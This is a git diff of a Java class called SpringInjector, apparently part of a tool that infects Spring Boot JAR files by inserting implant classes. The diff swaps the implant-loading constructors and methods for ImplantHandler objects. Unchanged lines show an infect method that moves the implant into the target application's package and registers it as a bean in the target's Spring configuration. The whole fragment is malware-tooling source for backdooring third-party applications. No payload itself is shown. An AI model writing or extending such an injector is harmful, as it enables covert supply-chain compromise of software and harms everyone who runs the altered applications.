@@ -13,44 +13,12 @@ import java.util.jar.JarEntry;
 import static org.example.injector.Helpers.*;
 
 public class SpringInjector {
-    private final Class<?> implantComponentClass;
-    private final Class<?> implantSpringConfigClass;
-    private final Path implantComponentPath;
-    private final Path implantSpringConfigPath;
+    private final ImplantHandler implantComponentHandler;
+    private final ImplantHandler implantSpringConfigHandler;
 
-
-    public SpringInjector(Class<?> implantComponent, Class<?> implantSpringConfig) {
-        this.implantComponentClass = implantComponent;
-        this.implantSpringConfigClass = implantSpringConfig;
-        this.implantComponentPath = null;
-        this.implantSpringConfigPath = null;
-    }
-
-    public SpringInjector(Path implantComponentPath, Path implantSpringConfigPath) {
-        this.implantComponentClass = null;
-        this.implantSpringConfigClass = null;
-        this.implantComponentPath = implantComponentPath;
-        this.implantSpringConfigPath = implantSpringConfigPath;
-    }
-
-    private ClassFile loadFreshImplantComponentInstance() throws IOException, ClassNotFoundException {
-        if (implantComponentClass != null) {
-            return ImplantReader.findAndReadClassFile(implantComponentClass);
-        } else if (implantComponentPath != null) {
-            return ImplantReader.readImplantClass(implantComponentPath);
-        } else {
-            throw new RuntimeException("Somehow, the implant class is not specified.");
-        }
-    }
-
-    private ClassFile loadFreshImplantSpringConfigInstance() throws IOException, ClassNotFoundException {
-        if (implantSpringConfigClass != null) {
-            return ImplantReader.findAndReadClassFile(implantSpringConfigClass);
-        } else if (implantSpringConfigPath != null) {
-            return ImplantReader.readImplantClass(implantSpringConfigPath);
-        } else {
-            throw new RuntimeException("Somehow, the implant class is not specified.");
-        }
+    public SpringInjector(ImplantHandler implantComponentHandler, ImplantHandler implantSpringConfigHandler) {
+        this.implantComponentHandler = implantComponentHandler;
+        this.implantSpringConfigHandler = implantSpringConfigHandler;
     }
 
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
@@ -83,7 +51,7 @@ public class SpringInjector {
                      * @ComponentScan is used (included in the @SpringBootApplication annotation). If not, then this
                      * component needs to be explicitly referenced as a @Bean in the config class.
                      */
-                    ClassFile implantComponent = loadFreshImplantComponentInstance();
+                    ClassFile implantComponent = implantComponentHandler.loadFreshSpecimen();
                     String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
                     String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
                     implantComponent.setName(targetPackageName + "." + implantComponentClassName);
@@ -125,7 +93,7 @@ public class SpringInjector {
     }
 
     private boolean addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantComponent) throws IOException, ClassNotFoundException {
-        ClassFile implantSpringConfig = loadFreshImplantSpringConfigInstance();
+        ClassFile implantSpringConfig = implantSpringConfigHandler.loadFreshSpecimen();
         String implantPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(implantSpringConfig.getName()));
         String targetPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(existingSpringConfig.getName()));
         String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
